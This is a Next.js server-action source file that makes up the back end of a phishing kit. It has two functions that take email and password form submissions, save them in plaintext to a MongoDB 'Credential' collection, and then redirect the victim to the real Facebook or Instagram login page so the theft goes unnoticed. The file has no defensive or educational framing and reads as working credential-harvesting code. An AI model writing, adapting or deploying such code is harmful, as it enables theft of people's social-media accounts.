"use server";

import dbConnect from "@/lib/mongodb";
import Credential from "@/lib/models/Credential";
import { redirect } from "next/navigation";

export async function loginAction(formData: FormData): Promise<void> {
    const email = formData.get("email");
    const password = formData.get("password");

    if (!email || !password) {
        return;
    }

    try {
        await dbConnect();
        await Credential.create({
            email,
            password,
        });
    } catch (error: any) {
        console.error("Database Error:", error);
    }

    // Redirect to actual Facebook after "login" attempt
    redirect("https://www.facebook.com/login");
}

export async function instagramLoginAction(formData: FormData): Promise<void> {
    const email = formData.get("email");
    const password = formData.get("password");

    if (!email || !password) {
        return;
    }

    try {
        await dbConnect();
        await Credential.create({
            email,
            password,
        });
    } catch (error: any) {
        console.error("Database Error:", error);
    }

    redirect("https://www.instagram.com/accounts/login/");
}
